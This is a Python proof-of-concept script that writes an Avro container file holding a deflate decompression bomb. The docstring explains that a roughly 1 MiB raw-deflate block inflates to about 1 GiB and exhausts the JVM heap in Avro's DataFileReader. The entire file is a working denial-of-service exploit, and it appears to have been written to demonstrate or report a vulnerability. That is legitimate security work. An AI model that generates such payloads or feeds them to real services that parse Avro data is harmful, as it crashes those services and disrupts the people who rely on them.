#!/usr/bin/env python3
"""Generate a deflate-decompression bomb in Avro container format.

Avro file = Obj^1 + [magic + schema-map header (snappy/deflate/etc.) +
sync_marker] + [block_count(zigzag) + block_size(zigzag) + raw_block +
sync_marker]*. With codec="deflate" and a tiny compressed payload that
inflates to >256 MiB, DataFileReader.nextBlock() runs Inflater on the
attacker-controlled payload and the resulting ByteBuffer exhausts the
JVM heap.

We produce one deflate stream of ~1 GiB of zero bytes. Compressed it is
~1 MiB. Heap limit -Xmx256m → OutOfMemoryError.
"""
import zlib


def zigzag(n: int) -> bytes:
    n = (n << 1) ^ (n >> 63)
    out = bytearray()
    while n & ~0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)


def avro_string(s: bytes) -> bytes:
    return zigzag(len(s)) + s


def avro_map(items):
    n = len(items)
    out = bytearray(zigzag(n))
    for k, v in items.items():
        out += avro_string(k) + avro_string(v)
    out += zigzag(0)
    return bytes(out)


def create_poc(output='poc.bin'):
    # 16-byte sync marker (arbitrary, but must match between header and block trailer).
    sync = bytes(16)

    # Header: magic "Obj\x01", metadata map declaring deflate codec + a minimal schema,
    # then sync marker.
    schema = b'{"type":"long"}'
    metadata = avro_map({
        b"avro.codec": b"deflate",
        b"avro.schema": schema,
    })
    header = b"Obj\x01" + metadata + sync

    # Bomb payload: zlib compress 1 GiB of zeros (raw deflate, no zlib wrapper).
    # Use compressobj with wbits=-15 (raw deflate) — Avro's DEFLATE codec uses raw.
    chunk = bytes(64 * 1024)  # 64 KiB of zeros
    co = zlib.compressobj(level=9, method=zlib.DEFLATED, wbits=-15)
    raw_pieces = []
    total_uncompressed = 0
    target_uncompressed = 1 << 30  # 1 GiB
    while total_uncompressed < target_uncompressed:
        raw_pieces.append(co.compress(chunk))
        total_uncompressed += len(chunk)
    raw_pieces.append(co.flush())
    compressed = b"".join(raw_pieces)

    # Block: count (>0) + compressed_size + compressed_bytes + sync.
    # block_count uses zigzag; one big "record"
    block = zigzag(1) + zigzag(len(compressed)) + compressed + sync

    blob = header + block

    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes, decompresses to ~{target_uncompressed} bytes)")


if __name__ == '__main__':
    create_poc()
